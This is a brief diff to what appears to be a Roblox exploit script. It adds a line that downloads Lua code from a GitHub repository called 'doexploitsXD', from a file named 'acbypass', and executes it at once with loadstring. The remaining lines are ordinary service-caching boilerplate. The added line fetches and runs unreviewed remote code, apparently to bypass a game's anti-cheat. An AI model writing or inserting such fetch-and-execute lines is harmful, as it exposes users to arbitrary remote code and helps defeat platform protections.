@@ -1,5 +1,7 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/doexploitsXD/projects/refs/heads/main/acbypass'))()
+
 Services = setmetatable({}, {
 	__index = function(self, name)
 		local success, cache = pcall(function()
